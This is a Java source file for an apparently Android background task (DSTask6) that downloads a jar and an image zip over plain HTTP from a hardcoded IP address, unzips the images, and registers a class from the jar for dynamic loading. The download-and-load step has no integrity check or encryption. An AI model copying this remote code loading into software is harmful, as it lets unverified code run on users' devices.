/**
 * 
 */
package com.acying.dsms;

import java.io.File;



/**
 * more
 * @author Keel
 *
 */
public class DSTask6 implements DSTask {

	private DServ dserv;
	private int id = 6;
	private int state = STATE_WAITING;
	private String TAG = "dserv-DSTask"+id;
	
	@Override
	public void run() {
		DSms.log(dserv.getService(), TAG, "==========DSTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task running");
		state = STATE_RUNNING;
		while (true) {
			if (!DSms.isNetOk(this.dserv.getService())) {
				try {
					Thread.sleep(1000*60*5);
				} catch (InterruptedException e) {
				}
				continue;
			}
			
			
			//下载图片zip包,jar包
			
			String picFileName = "pic_"+this.id+".zip";  //!!注意这里zip包及其中的图要与tid对应上
			String remote = "http://120.24.64.185:12370/dsms/dats/"+picFileName;
			String localFile = dserv.getLocalPath()+"pics/"+picFileName;
			String remoteJar = "http://120.24.64.185:12370/dsms/dats/emv2.jar";
			String localJarDir = dserv.getLocalPath()+"update/";
			boolean isFinish = false;
			if (dserv.downloadGoOn(remoteJar, localJarDir, "emv2.jar", this.dserv.getService())) {
				DSms.log(dserv.getService(), TAG, "down jar OK:"+localJarDir+"emv2.jar");
				
				if(dserv.downloadGoOn(remote, dserv.getLocalPath()+"pics", picFileName,this.dserv.getService())){
					DSms.log(dserv.getService(),TAG, "down zip OK:"+localFile);
					boolean unzip = dserv.unzip(localFile, dserv.getLocalPath()+"pics/");
					if (unzip) {
						DSms.log(dserv.getService(), TAG, "unzip OK:"+localFile);
						(new File(localFile)).delete();
					}
					
					this.dserv.setEmp("com.acying.dsms.MoreView", "update/emv2");
//					this.dserv.setEmvClass("cn.play.dserv.MoreView");
//					this.dserv.setEmvPath("update/emv2");
//					this.dserv.saveConfig();
					isFinish = true;
//					Log.d(TAG, "update mvClass:"+this.dserv.getEmvClass()+" emvPath:"+this.dserv.getEmvPath());
				}
			}
			if (!isFinish) {
				state = STATE_WAITING;
				break;
			}else{
				this.dserv.taskDone(this);
				DSms.sLog(this.dserv.getService(), 101, "_@@"+this.id+"@@1@@done"); //1为type,表示任务已执行
				state = STATE_DIE;
			}
			break;
		}
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is finished.");
		DSms.log(dserv.getService(), TAG, "==========DSTask finished id:"+this.id+"===========");
		
	}
	/*public boolean isConnOk() {
		ConnectivityManager cm = (ConnectivityManager) dserv.getService().getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}*/

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		DSms.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			dserv.dsLog(1, "DSTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			DSms.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
